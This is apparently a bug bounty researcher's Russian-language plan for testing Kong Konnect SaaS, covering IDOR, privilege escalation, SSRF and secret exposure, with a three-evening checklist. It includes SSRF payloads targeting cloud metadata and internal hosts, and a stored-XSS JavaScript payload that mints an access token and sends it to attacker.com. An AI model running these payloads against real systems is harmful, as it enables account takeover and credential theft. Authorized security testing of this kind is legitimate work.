# Kong Attack Plan

## Что я делал (статический анализ) vs Что нужно делать

| Мой подход | Правильный подход |
|------------|-------------------|
| Grep по исходникам | Burp + живой Konnect |
| Искал `os.execute` в Lua | Искать IDOR в API `/orgs/<id>/...` |
| Смотрел sandbox в коде | Тестить границы tenant'ов |
| Читал схемы плагинов | Подставлять чужие UUID в запросы |

**Вывод:** Мои находки (command injection в CLI, ssl_verify=false) - это Low/Medium в лучшем случае, т.к. требуют уже иметь доступ к серверу или Admin API.

---

## Реальные таргеты (по приоритету)

### 🎯 Priority 1: Kong Konnect (SaaS)
**URL:** https://cloud.konghq.com

**Критические точки:**
- `orgId` / `workspaceId` / `control_plane_id` / `teamId` в API
- Роли: Owner → Admin → Developer → Viewer
- Приглашения пользователей
- API токены / credentials

**Атаки:**
```
GET /api/v2/organizations/{orgId}/control-planes
GET /api/v2/control-planes/{cpId}/services
POST /api/v2/organizations/{orgId}/teams/{teamId}/members
```

**Что проверять:**
1. Подменить `orgId` на чужой UUID → IDOR
2. Viewer пытается сделать POST/PUT/DELETE → Privilege Escalation
3. Удалить `orgId` из запроса → возможно видно все org

---

### 🎯 Priority 2: SSRF через конфиги

**Где искать URL-поля:**
- Upstream URL сервиса
- Health check endpoints
- Webhook URLs
- Git integration URLs
- Plugin configs (http-log endpoint, etc)

**Payloads:**
```
http://169.254.169.254/latest/meta-data/
http://localhost:8001/
http://internal-service.kong.svc.cluster.local/
```

**Цель:** Показать, что Kong-сервер делает запрос на мой контролируемый URL или internal metadata

---

### 🎯 Priority 3: Token/Secret Exposure

**Где могут течь секреты:**
- API responses (лишние поля)
- Audit logs
- Export configs
- Error messages

**Сценарий:**
- Viewer role запрашивает `/api/.../credentials` и видит секреты
- Или: в ответе на `GET /services` есть `upstream_password` в plaintext

---

### 🎯 Priority 4: XSS с импактом

**Где вводить payload:**
- Имена: org, workspace, service, route, plugin
- Custom headers/tags
- Description поля

**Payload должен:**
```javascript
// Не просто alert(1), а:
fetch('/api/v2/personal-access-tokens', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({name: 'pwned'})
}).then(r => r.json()).then(d => {
  new Image().src = 'https://attacker.com/steal?token=' + d.token
})
```

---

## План на 3 вечера

### Вечер 1: Разведка
- [ ] Зарегаться в Konnect
- [ ] Создать org, workspace, service, route
- [ ] Записать ВСЕ запросы в Burp
- [ ] Найти все endpoints с `{id}` параметрами
- [ ] Составить карту ролей

### Вечер 2: IDOR/AuthZ
- [ ] Создать 2й аккаунт (другая org)
- [ ] Попробовать UUID от org1 в запросах org2
- [ ] Тестить viewer → admin escalation
- [ ] Искать endpoints без проверки tenant

### Вечер 3: SSRF + Secrets
- [ ] Найти все URL-поля в конфигах
- [ ] Подставить webhook.site / свой VPS
- [ ] Проверить AWS metadata
- [ ] Искать секреты в API responses

---

## Мои текущие находки - переоценка

| Находка | Старая оценка | Реальная оценка |
|---------|---------------|-----------------|
| Command Injection в hybrid.lua | HIGH | **LOW** - требует CLI доступ |
| ssl_verify=false | HIGH | **LOW/INFO** - design decision |
| Sandbox escape (ngx) | MEDIUM | **LOW** - нужен Admin API |
| file-log path traversal | HIGH | **MEDIUM** - нужен Admin API |

**Почему:** Все эти баги требуют уже иметь доступ к Kong серверу или Admin API. А программа ищет баги в **Konnect SaaS**, где у атакующего только браузер.

---

## Что реально может принести bounty

1. **IDOR в Konnect API** - $500-$1000
   - Чтение чужих org/services/credentials
   
2. **SSRF из Konnect** - $500-$1500
   - Заставить их сервер пойти на internal URL
   
3. **Privilege Escalation** - $500-$1000
   - Viewer → Admin в своей org
   - Member → Owner
   
4. **Stored XSS → Token Theft** - $300-$500
   - XSS в имени сервиса + PoC кражи токена

---

## Ограничения статического анализа

Я могу найти в коде:
- Паттерны уязвимого кода
- Отсутствие валидации
- Hardcoded secrets

Но я **НЕ могу** проверить:
- Реальную авторизацию в Konnect API
- Работает ли SSRF на проде
- Какие данные возвращает API разным ролям

**Вывод:** Нужен живой тест с Burp на https://cloud.konghq.com

---

## Insights из анализа кода

### Workspace Isolation (kong/workspaces/init.lua)

```lua
function workspaces.get_workspace_id(ctx)
  return (ctx or ngx.ctx).workspace or kong.default_workspace
end
```

**Что искать в Konnect:**
- Workspace ID передаётся в `ngx.ctx` - проверить можно ли его переопределить через headers
- `kong.default_workspace` - fallback, если workspace не указан

### API Endpoints (kong/api/endpoints.lua:147)

```lua
local options = {
  workspace = workspaces.get_workspace_id(),
}
```

**Ключевой момент:** Все запросы к Admin API фильтруются по `workspace`. 

**Что тестить:**
1. Убрать workspace из запроса → видны ли все entities?
2. Подставить чужой workspace_id → IDOR?
3. Создать entity без workspace → к какому workspace привяжется?

### Генерация Endpoints

Паттерны API:
```
GET  /services
POST /services
GET  /services/:services
PUT  /services/:services
GET  /services/:services/routes
POST /services/:services/routes
```

**Для IDOR тестировать:** `:services`, `:routes`, `:plugins`, `:consumers` - все ID параметры
